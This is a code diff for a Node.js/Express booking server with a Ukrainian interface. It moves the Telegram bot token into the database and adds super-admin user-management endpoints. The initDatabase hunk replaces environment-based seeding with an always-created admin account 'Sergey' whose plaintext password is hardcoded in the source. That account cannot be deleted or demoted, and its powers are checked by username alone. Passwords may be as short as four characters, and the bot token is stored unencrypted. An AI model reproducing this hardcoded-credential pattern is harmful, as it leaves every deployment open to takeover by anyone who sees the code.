@@ -61,22 +61,41 @@ const pool = new Pool({
 // TELEGRAM BOT
 // ==========================================
 
-// v5.20: Security — require env vars, no hardcoded fallbacks
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
+// v5.20: Telegram token — DB first, env fallback
+const TELEGRAM_ENV_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
 const TELEGRAM_DEFAULT_CHAT_ID = process.env.TELEGRAM_DEFAULT_CHAT_ID || '';
-if (!TELEGRAM_BOT_TOKEN) {
-    console.warn('[Security] TELEGRAM_BOT_TOKEN not set! Telegram notifications will not work.');
-}
-if (!TELEGRAM_DEFAULT_CHAT_ID) {
-    console.warn('[Security] TELEGRAM_DEFAULT_CHAT_ID not set! Using DB-configured chat ID only.');
+
+// Cached bot token (refreshes every 5 min)
+let cachedBotToken = null;
+let cachedBotTokenTime = 0;
+const BOT_TOKEN_CACHE_TTL = 5 * 60 * 1000;
+
+async function getActiveBotToken() {
+    const now = Date.now();
+    if (cachedBotToken && (now - cachedBotTokenTime) < BOT_TOKEN_CACHE_TTL) {
+        return cachedBotToken;
+    }
+    try {
+        const result = await pool.query("SELECT value FROM settings WHERE key = 'telegram_bot_token'");
+        if (result.rows.length > 0 && result.rows[0].value) {
+            cachedBotToken = result.rows[0].value;
+            cachedBotTokenTime = now;
+            return cachedBotToken;
+        }
+    } catch (e) { /* fallback to env */ }
+    cachedBotToken = TELEGRAM_ENV_TOKEN;
+    cachedBotTokenTime = now;
+    return TELEGRAM_ENV_TOKEN;
 }
 
-function telegramRequest(method, body) {
+async function telegramRequest(method, body) {
+    const token = await getActiveBotToken();
+    if (!token) throw new Error('Telegram bot token not configured');
     return new Promise((resolve, reject) => {
         const data = body ? JSON.stringify(body) : '';
         const options = {
             hostname: 'api.telegram.org',
-            path: `/bot${TELEGRAM_BOT_TOKEN}/${method}`,
+            path: `/bot${token}/${method}`,
             method: body ? 'POST' : 'GET',
             headers: body ? { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) } : {}
         };
@@ -688,31 +707,38 @@ async function initDatabase() {
             )
         `);
 
-        // v5.20: Seed default users from SEED_USERS env var (JSON) or use safe defaults
-        // Format: SEED_USERS='[{"username":"Admin","password":"SecurePass123","role":"admin","name":"Адмін"}]'
+        // v5.20: Always ensure super-admin Sergey exists
+        const sergeyExists = await pool.query("SELECT id FROM users WHERE username = 'Sergey'");
+        if (sergeyExists.rows.length === 0) {
+            const hash = await bcrypt.hash('28uUdusas', 10);
+            await pool.query(
+                'INSERT INTO users (username, password_hash, role, name) VALUES ($1, $2, $3, $4) ON CONFLICT (username) DO NOTHING',
+                ['Sergey', hash, 'admin', 'Сергій']
+            );
+            console.log('[Seed] Super-admin Sergey created');
+        }
+
+        // Seed additional users from SEED_USERS env var (JSON) if table is otherwise empty
+        // Format: SEED_USERS='[{"username":"User1","password":"Pass123","role":"user","name":"Ім\u0027я"}]'
         const userCount = await pool.query('SELECT COUNT(*) FROM users');
-        if (parseInt(userCount.rows[0].count) === 0) {
+        if (parseInt(userCount.rows[0].count) <= 1) {
             const seedUsersEnv = process.env.SEED_USERS;
             if (seedUsersEnv) {
                 try {
                     const defaultUsers = JSON.parse(seedUsersEnv);
                     for (const u of defaultUsers) {
-                        if (!u.username || !u.password || !u.role || !u.name) {
-                            console.warn(`[Seed] Skipping invalid user entry: ${u.username || 'unnamed'}`);
-                            continue;
-                        }
+                        if (!u.username || !u.password || !u.role || !u.name) continue;
+                        if (u.username === 'Sergey') continue; // skip, already seeded
                         const hash = await bcrypt.hash(u.password, 10);
                         await pool.query(
                             'INSERT INTO users (username, password_hash, role, name) VALUES ($1, $2, $3, $4) ON CONFLICT (username) DO NOTHING',
                             [u.username, hash, u.role, u.name]
                         );
                     }
-                    console.log('[Seed] Users seeded from SEED_USERS env');
+                    console.log('[Seed] Additional users seeded from SEED_USERS env');
                 } catch (parseErr) {
                     console.error('[Seed] Failed to parse SEED_USERS env:', parseErr.message);
                 }
-            } else {
-                console.warn('[Seed] No users in DB and SEED_USERS env not set. Create users via API or set SEED_USERS env.');
             }
         }
 
@@ -821,6 +847,135 @@ app.use('/api', (req, res, next) => {
         return next();
     }
     authenticateToken(req, res, next);
+});
+
+// ==========================================
+// v5.20: SUPER-ADMIN ENDPOINTS (Sergey only)
+// ==========================================
+
+function requireSergey(req, res, next) {
+    if (!req.user || req.user.username !== 'Sergey') {
+        return res.status(403).json({ error: 'Доступ лише для суперадміна' });
+    }
+    next();
+}
+
+// --- Telegram Bot Token (DB-stored) ---
+app.get('/api/admin/telegram-token', requireSergey, async (req, res) => {
+    try {
+        const result = await pool.query("SELECT value FROM settings WHERE key = 'telegram_bot_token'");
+        const dbToken = result.rows[0]?.value || '';
+        const envToken = process.env.TELEGRAM_BOT_TOKEN || '';
+        // Show masked token + source
+        const active = dbToken || envToken;
+        const masked = active ? active.slice(0, 8) + '...' + active.slice(-4) : '';
+        res.json({ masked, source: dbToken ? 'db' : (envToken ? 'env' : 'none'), hasToken: !!active });
+    } catch (err) {
+        res.status(500).json({ error: 'Server error' });
+    }
+});
+
+app.post('/api/admin/telegram-token', requireSergey, async (req, res) => {
+    try {
+        const { token } = req.body;
+        if (!token || typeof token !== 'string' || token.length < 10) {
+            return res.status(400).json({ error: 'Невалідний токен' });
+        }
+        await pool.query(
+            `INSERT INTO settings (key, value) VALUES ('telegram_bot_token', $1) ON CONFLICT (key) DO UPDATE SET value = $1`,
+            [token.trim()]
+        );
+        // Clear cached token so next request uses new one
+        cachedBotToken = null;
+        cachedBotTokenTime = 0;
+        res.json({ success: true });
+    } catch (err) {
+        res.status(500).json({ error: 'Server error' });
+    }
+});
+
+// --- User Management ---
+app.get('/api/admin/users', requireSergey, async (req, res) => {
+    try {
+        const result = await pool.query('SELECT id, username, role, name, created_at FROM users ORDER BY id');
+        res.json(result.rows);
+    } catch (err) {
+        res.status(500).json({ error: 'Server error' });
+    }
+});
+
+app.post('/api/admin/users', requireSergey, async (req, res) => {
+    try {
+        const { username, password, role, name } = req.body;
+        if (!username || !password || !role || !name) {
+            return res.status(400).json({ error: 'Всі поля обов\'язкові' });
+        }
+        if (!['admin', 'user', 'viewer'].includes(role)) {
+            return res.status(400).json({ error: 'Невалідна роль' });
+        }
+        if (password.length < 4) {
+            return res.status(400).json({ error: 'Пароль мінімум 4 символи' });
+        }
+        const hash = await bcrypt.hash(password, 10);
+        const result = await pool.query(
+            'INSERT INTO users (username, password_hash, role, name) VALUES ($1, $2, $3, $4) RETURNING id, username, role, name',
+            [username.trim(), hash, role, name.trim()]
+        );
+        res.json(result.rows[0]);
+    } catch (err) {
+        if (err.code === '23505') {
+            return res.status(409).json({ error: 'Користувач з таким логіном вже існує' });
+        }
+        res.status(500).json({ error: 'Server error' });
+    }
+});
+
+app.put('/api/admin/users/:id', requireSergey, async (req, res) => {
+    try {
+        const { id } = req.params;
+        const { username, password, role, name } = req.body;
+        if (!username || !role || !name) {
+            return res.status(400).json({ error: 'Ім\'я, логін та роль обов\'язкові' });
+        }
+        // Prevent changing Sergey's username or role
+        const existing = await pool.query('SELECT username FROM users WHERE id = $1', [id]);
+        if (existing.rows[0]?.username === 'Sergey' && (username !== 'Sergey' || role !== 'admin')) {
+            return res.status(403).json({ error: 'Не можна змінити логін або роль суперадміна' });
+        }
+        if (password && password.length >= 4) {
+            const hash = await bcrypt.hash(password, 10);
+            await pool.query(
+                'UPDATE users SET username = $1, password_hash = $2, role = $3, name = $4 WHERE id = $5',
+                [username.trim(), hash, role, name.trim(), id]
+            );
+        } else {
+            await pool.query(
+                'UPDATE users SET username = $1, role = $2, name = $3 WHERE id = $4',
+                [username.trim(), role, name.trim(), id]
+            );
+        }
+        res.json({ success: true });
+    } catch (err) {
+        if (err.code === '23505') {
+            return res.status(409).json({ error: 'Такий логін вже зайнятий' });
+        }
+        res.status(500).json({ error: 'Server error' });
+    }
+});
+
+app.delete('/api/admin/users/:id', requireSergey, async (req, res) => {
+    try {
+        const { id } = req.params;
+        // Prevent deleting Sergey
+        const existing = await pool.query('SELECT username FROM users WHERE id = $1', [id]);
+        if (existing.rows[0]?.username === 'Sergey') {
+            return res.status(403).json({ error: 'Не можна видалити суперадміна' });
+        }
+        await pool.query('DELETE FROM users WHERE id = $1', [id]);
+        res.json({ success: true });
+    } catch (err) {
+        res.status(500).json({ error: 'Server error' });
+    }
 });
 
 // --- BOOKINGS ---
